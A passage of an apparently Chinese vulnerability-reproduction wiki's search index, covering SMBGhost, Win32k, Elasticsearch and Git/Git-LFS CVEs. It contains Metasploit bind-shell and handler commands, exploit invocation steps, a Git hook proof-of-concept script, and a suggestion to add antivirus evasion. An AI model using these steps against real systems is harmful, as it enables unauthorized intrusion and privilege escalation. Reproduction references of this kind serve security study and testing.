windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py \u5c06\u751f\u6210exp.py\u4e2d\u7684shellcode\u66ff\u6362exploit.py\u4e2d\u7684shellcode [!NOTE] buf \u8981\u66ff\u6362\u4e3a USER_PAYLOAD \u4f7f\u7528 MSF msf5 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp payload => windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) > set lport 2333 lport => 2333 msf5 exploit(multi/handler) > set rhost 192.168.1.110 rhost => 192.168.1.110 msf5 exploit(multi/handler) > exploit \u6267\u884c\u811a\u672c\u5373\u53ef python3 exploit.py -ip 192.168.1.110 [!NOTE] \u6ce8\u610f\u6709\u84dd\u5c4f\u6982\u7387","title":"CVE-2020-0796 RCE EXP"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-0796/#\u53c2\u8003\u6587\u7ae0","text":"Windows SMB Ghost\uff08CVE-2020-0796\uff09\u6f0f\u6d1e\u5206\u6790","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/","text":"Windows Win32k \u672c\u5730\u63d0\u6743\u6f0f\u6d1e CVE-2021-1732 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2021\u5e742\u670810\u65e5\uff0c\u5fae\u8f6f\u6bcf\u6708\u7684\u4f8b\u884c\u8865\u4e01\u5305\u4e2d\u4fee\u590d\u4e86\u4e00\u4e2aWindows\u7cfb\u7edf\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\uff0c\u672c\u5730\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u63d0\u5347\u5230system\u6743\u9650\uff0c\u636e\u79f0\u6b64\u6f0f\u6d1e\u88ab\u7528\u4e8e\u5b9a\u5411\u653b\u51fb\u6d3b\u52a8\u3002 \u5947\u5b89\u4fe1\u606f\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3\u7ea2\u96e8\u6ef4\u56e2\u961f\u7b2c\u4e00\u65f6\u95f4\u8ddf\u8fdb\u8be5\u6f0f\u6d1e\u5e76\u786e\u8ba4\u5176\u53ef\u7528\u6027\uff0c\u6f0f\u6d1e\u76f8\u5e94\u7684\u5229\u7528\u7a0b\u5e8f\u5df2\u7ecf\u516c\u5f00\uff0c\u6709\u53ef\u80fd\u88ab\u6539\u9020\u6765\u6267\u884c\u5927\u8303\u56f4\u7684\u653b\u51fb\uff0c\u5df2\u7ecf\u6784\u6210\u73b0\u5b9e\u7684\u5a01\u80c1\u3002\u76ee\u524d\u5fae\u8f6f\u5df2\u7ecf\u4fee\u8865\u4e86\u6b64\u6f0f\u6d1e\uff0c\u5947\u5b89\u4fe1\u606f\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3\u63d0\u9192\u76f8\u5173\u7528\u6237\u53ca\u65f6\u5b89\u88c52\u6708\u8865\u4e01\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd9\u91cc\u4f7f\u7528\u817e\u8baf\u4e91\u7684Windows 2019 Server \u642d\u5efa\u73af\u5883 \u76ee\u524dEXP\u5df2\u7ecf\u516c\u5f00\u4e86 [!NOTE] \u516c\u4f17\u53f7\u53d1\u9001 CVE-2021-1732 \u53ef\u4ee5\u83b7\u53d6\u7f16\u8bd1\u597d\u7684 EXP Github\u516c\u5f00\u5730\u5740: https://github.com/KaLendsi/CVE-2021-1732-Exploit \u5389\u5bb3\u7684\u5e08\u5085\u53ef\u4ee5\u505a\u4e00\u4e0b\u514d\u6740\uff0c\u73b0\u5728\u4e00\u4e0a\u4f20\u5c31\u4f1a\u88ab\u6740\u4e86 \u4e0a\u4f20\u5230\u670d\u52a1\u5668\u8fd0\u884c, \u6b64\u65f6\u662f\u4ee5**System\u6743\u9650**\u8fd0\u884c [!NOTE] \u6709\u84dd\u5c4f\u6982\u7387\uff0c\u4f7f\u7528\u8c28\u614e\u70b9\u6492 CVE-2021-1723 whoami \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s/Ato-oKmNeyziXkKCr8d4kg","title":"Windows Win32k \u672c\u5730\u63d0\u6743\u6f0f\u6d1e CVE-2021-1732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/#windows-win32k-\u672c\u5730\u63d0\u6743\u6f0f\u6d1e-cve-2021-1732","text":"","title":"Windows Win32k \u672c\u5730\u63d0\u6743\u6f0f\u6d1e CVE-2021-1732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2021\u5e742\u670810\u65e5\uff0c\u5fae\u8f6f\u6bcf\u6708\u7684\u4f8b\u884c\u8865\u4e01\u5305\u4e2d\u4fee\u590d\u4e86\u4e00\u4e2aWindows\u7cfb\u7edf\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\uff0c\u672c\u5730\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u63d0\u5347\u5230system\u6743\u9650\uff0c\u636e\u79f0\u6b64\u6f0f\u6d1e\u88ab\u7528\u4e8e\u5b9a\u5411\u653b\u51fb\u6d3b\u52a8\u3002 \u5947\u5b89\u4fe1\u606f\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3\u7ea2\u96e8\u6ef4\u56e2\u961f\u7b2c\u4e00\u65f6\u95f4\u8ddf\u8fdb\u8be5\u6f0f\u6d1e\u5e76\u786e\u8ba4\u5176\u53ef\u7528\u6027\uff0c\u6f0f\u6d1e\u76f8\u5e94\u7684\u5229\u7528\u7a0b\u5e8f\u5df2\u7ecf\u516c\u5f00\uff0c\u6709\u53ef\u80fd\u88ab\u6539\u9020\u6765\u6267\u884c\u5927\u8303\u56f4\u7684\u653b\u51fb\uff0c\u5df2\u7ecf\u6784\u6210\u73b0\u5b9e\u7684\u5a01\u80c1\u3002\u76ee\u524d\u5fae\u8f6f\u5df2\u7ecf\u4fee\u8865\u4e86\u6b64\u6f0f\u6d1e\uff0c\u5947\u5b89\u4fe1\u606f\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3\u63d0\u9192\u76f8\u5173\u7528\u6237\u53ca\u65f6\u5b89\u88c52\u6708\u8865\u4e01\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd9\u91cc\u4f7f\u7528\u817e\u8baf\u4e91\u7684Windows 2019 Server \u642d\u5efa\u73af\u5883 \u76ee\u524dEXP\u5df2\u7ecf\u516c\u5f00\u4e86 [!NOTE] \u516c\u4f17\u53f7\u53d1\u9001 CVE-2021-1732 \u53ef\u4ee5\u83b7\u53d6\u7f16\u8bd1\u597d\u7684 EXP Github\u516c\u5f00\u5730\u5740: https://github.com/KaLendsi/CVE-2021-1732-Exploit \u5389\u5bb3\u7684\u5e08\u5085\u53ef\u4ee5\u505a\u4e00\u4e0b\u514d\u6740\uff0c\u73b0\u5728\u4e00\u4e0a\u4f20\u5c31\u4f1a\u88ab\u6740\u4e86 \u4e0a\u4f20\u5230\u670d\u52a1\u5668\u8fd0\u884c, \u6b64\u65f6\u662f\u4ee5**System\u6743\u9650**\u8fd0\u884c [!NOTE] \u6709\u84dd\u5c4f\u6982\u7387\uff0c\u4f7f\u7528\u8c28\u614e\u70b9\u6492 CVE-2021-1723 whoami","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s/Ato-oKmNeyziXkKCr8d4kg","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20CVE-2020-0796/","text":"\u626b\u63cf\u5de5\u5177 CVE-2020-0796 \u00b6 Scan\u76ee\u5f55\u4ee5\u653e\u9488\u5bf9 CVE-2020-0796 4\u79cd\u4e0d\u540c\u5229\u7528\u65b9\u5f0f\u7684POC \u5947\u5b89\u4fe1 CVE-2020-0796 \u626b\u63cf\u4e0b\u8f7d Github CVE-2020-0796 \u84dd\u5c4fEXP \u4e0b\u8f7d Github CVE-2020-0796 \u672c\u5730\u63d0\u6743EXP \u4e0b\u8f7d Github CVE-2020-0796 RCE EXP","title":"\u626b\u63cf\u5de5\u5177 CVE-2020-0796"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20CVE-2020-0796/#\u626b\u63cf\u5de5\u5177-cve-2020-0796","text":"Scan\u76ee\u5f55\u4ee5\u653e\u9488\u5bf9 CVE-2020-0796 4\u79cd\u4e0d\u540c\u5229\u7528\u65b9\u5f0f\u7684POC \u5947\u5b89\u4fe1 CVE-2020-0796 \u626b\u63cf\u4e0b\u8f7d Github CVE-2020-0796 \u84dd\u5c4fEXP \u4e0b\u8f7d Github CVE-2020-0796 \u672c\u5730\u63d0\u6743EXP \u4e0b\u8f7d Github CVE-2020-0796 RCE EXP","title":"\u626b\u63cf\u5de5\u5177 CVE-2020-0796"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Elasticsearch/Elasticsearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","text":"Elasticsearch \u672a\u6388\u6743\u8bbf\u95ee \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Elasticsearch\u662f\u7528Java\u5f00\u53d1\u7684\u4f01\u4e1a\u7ea7\u641c\u7d22\u5f15\u64ce\uff0c\u9ed8\u8ba4\u7aef\u53e39200\uff0c\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u65f6\uff0c\u53ef\u88ab\u975e\u6cd5\u64cd\u4f5c\u6570\u636e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Elasticsearch \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u76ee\u6807URL : http://xxx.xxx.xxx.xxx:9200/_node http://localhost:9200/_cat/indices http://localhost:9200/_river/_search //\u67e5\u770b\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f http://localhost:9200/_nodes //\u67e5\u770b\u8282\u70b9\u6570\u636e http://localhost:9200/_plugin/head/ //web\u7ba1\u7406\u754c\u9762(head\u63d2\u4ef6)","title":"Elasticsearch \u672a\u6388\u6743\u8bbf\u95ee"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Elasticsearch/Elasticsearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#elasticsearch-\u672a\u6388\u6743\u8bbf\u95ee","text":"","title":"Elasticsearch \u672a\u6388\u6743\u8bbf\u95ee"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Elasticsearch/Elasticsearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Elasticsearch\u662f\u7528Java\u5f00\u53d1\u7684\u4f01\u4e1a\u7ea7\u641c\u7d22\u5f15\u64ce\uff0c\u9ed8\u8ba4\u7aef\u53e39200\uff0c\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u65f6\uff0c\u53ef\u88ab\u975e\u6cd5\u64cd\u4f5c\u6570\u636e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Elasticsearch/Elasticsearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Elasticsearch","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Elasticsearch/Elasticsearch%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u76ee\u6807URL : http://xxx.xxx.xxx.xxx:9200/_node http://localhost:9200/_cat/indices http://localhost:9200/_river/_search //\u67e5\u770b\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f http://localhost:9200/_nodes //\u67e5\u770b\u8282\u70b9\u6570\u636e http://localhost:9200/_plugin/head/ //web\u7ba1\u7406\u754c\u9762(head\u63d2\u4ef6)","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git%20for%20Visual%20Studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2021-21300/","text":"Git for Visual Studio\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e CVE-2021-21300 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6b64\u6f0f\u6d1e\u5f71\u54cd\u5177\u6709\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u6587\u4ef6\u7cfb\u7edf\u7684\u5e73\u53f0\uff0c\u5f53\u67d0\u4e9b\u8fc7\u6ee4\u5668\u88ab\u4f7f\u7528\u65f6\uff08\u4f8b\u5982Git LFS\uff09\u3002Git\u53ef\u80fd\u4f1a\u88ab\u6b3a\u9a97\u8fd0\u884c\u514b\u9686\u671f\u95f4\u7684\u8fdc\u7a0b\u4ee3\u7801\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] v2.17.6\uff0cv2.18.5\uff0cv2.19.6\uff0cv2.20.5\uff0cv2.21.4\uff0c v2.22.5\uff0cv2.23.4\uff0cv2.24.4\uff0cv2.25.5\uff0cv2.26.3\uff0cv2.27.1\uff0cv2.28.1\uff0cv2.29.3\uff0c v2.30.2\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6682\u65e0\u590d\u73b0 \u53c2\u8003\u6587\u7ae0: https://www.openwall.com/lists/oss-security/2021/03/09/3 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/bin/sh git init delayed-checkout && ( cd delayed-checkout && echo \"A/post-checkout filter=lfs diff=lfs merge=lfs\" \\ >.gitattributes && mkdir A && printf '#!/bin/sh\\n\\necho PWNED >&2\\n' >A/post-checkout && chmod +x A/post-checkout && >A/a && >A/b && git add -A && rm -rf A && ln -s .git/hooks a && git add a && git commit -m initial ) && git clone delayed-checkout cloned","title":"Git for Visual Studio\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e CVE-2021-21300"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git%20for%20Visual%20Studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2021-21300/#git-for-visual-studio\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e-cve-2021-21300","text":"","title":"Git for Visual Studio\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e CVE-2021-21300"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git%20for%20Visual%20Studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2021-21300/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6b64\u6f0f\u6d1e\u5f71\u54cd\u5177\u6709\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u6587\u4ef6\u7cfb\u7edf\u7684\u5e73\u53f0\uff0c\u5f53\u67d0\u4e9b\u8fc7\u6ee4\u5668\u88ab\u4f7f\u7528\u65f6\uff08\u4f8b\u5982Git LFS\uff09\u3002Git\u53ef\u80fd\u4f1a\u88ab\u6b3a\u9a97\u8fd0\u884c\u514b\u9686\u671f\u95f4\u7684\u8fdc\u7a0b\u4ee3\u7801\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git%20for%20Visual%20Studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2021-21300/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] v2.17.6\uff0cv2.18.5\uff0cv2.19.6\uff0cv2.20.5\uff0cv2.21.4\uff0c v2.22.5\uff0cv2.23.4\uff0cv2.24.4\uff0cv2.25.5\uff0cv2.26.3\uff0cv2.27.1\uff0cv2.28.1\uff0cv2.29.3\uff0c v2.30.2\u3002","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git%20for%20Visual%20Studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2021-21300/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6682\u65e0\u590d\u73b0 \u53c2\u8003\u6587\u7ae0: https://www.openwall.com/lists/oss-security/2021/03/09/3","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git%20for%20Visual%20Studio%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2021-21300/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/bin/sh git init delayed-checkout && ( cd delayed-checkout && echo \"A/post-checkout filter=lfs diff=lfs merge=lfs\" \\ >.gitattributes && mkdir A && printf '#!/bin/sh\\n\\necho PWNED >&2\\n' >A/post-checkout && chmod +x A/post-checkout && >A/a && >A/b && git add -A && rm -rf A && ln -s .git/hooks a && git add a && git commit -m initial ) && git clone delayed-checkout cloned","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git-LFS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-27955/","text":"Git-LFS \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-27955 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Git LFS \u662f Github \u5f00\u53d1\u7684\u4e00\u4e2a Git \u7684\u6269\u5c55\uff0c\u7528\u4e8e\u5b9e\u73b0 Git \u5bf9\u5927\u6587\u4ef6\u7684\u652f\u6301 \u4e00\u4e9b\u53d7\u5f71\u54cd\u7684\u4ea7\u54c1\u5305\u62ecGit\uff0cGitHub CLI\uff0cGitHub Desktop\uff0cVisual Studio\uff0cGitKraden\uff0cSmartGit\uff0cSourcetree\u7b49 \u8be5\u6f0f\u6d1e\u5f71\u54cd\u4ec5windows\u5e73\u53f0 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Git-LFS\uff08git-lfs\uff09<= 2.12 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd0\u884c\u4e0b\u5217\u7684\u547d\u4ee4\uff0c\u5982\u679c\u7248\u672c\u5728\u5f71\u54cd\u8303\u56f4\u5219\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668 git clone https://github.com/r00t4dm/CVE-2020-27955 \u6f0f\u6d1ePOC \u00b6 https://github.com/r00t4dm/CVE-2020-27955","title":"Git-LFS \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-27955"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git-LFS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-27955/#git-lfs-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-cve-2020-27955","text":"","title":"Git-LFS \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-27955"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git-LFS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-27955/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Git LFS \u662f Github \u5f00\u53d1\u7684\u4e00\u4e2a Git \u7684\u6269\u5c55\uff0c\u7528\u4e8e\u5b9e\u73b0 Git \u5bf9\u5927\u6587\u4ef6\u7684\u652f\u6301 \u4e00\u4e9b\u53d7\u5f71\u54cd\u7684\u4ea7\u54c1\u5305\u62ecGit\uff0cGitHub CLI\uff0cGitHub Desktop\uff0cVisual Studio\uff0cGitKraden\uff0cSmartGit\uff0cSourcetree\u7b49 \u8be5\u6f0f\u6d1e\u5f71\u54cd\u4ec5windows\u5e73\u53f0","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git-LFS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-27955/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Git-LFS\uff08git-lfs\uff09<= 2.12","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git-LFS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-27955/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd0\u884c\u4e0b\u5217\u7684\u547d\u4ee4\uff0c\u5982\u679c\u7248\u672c\u5728\u5f71\u54cd\u8303\u56f4\u5219\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668 git clone https://github.com/r00t4dm/CVE-2020-27955","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Git/Git-LFS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-27955/#\u6f0f\u6d1epoc","text":"https://github.com/r00t4dm/CVE-2020-27955","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/HongKe/HongKe%20ntopng%20%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2021-28073/","text":"HongKe ntopng \u6d41\u91cf\u5206\u6790\u7cfb\u7edf 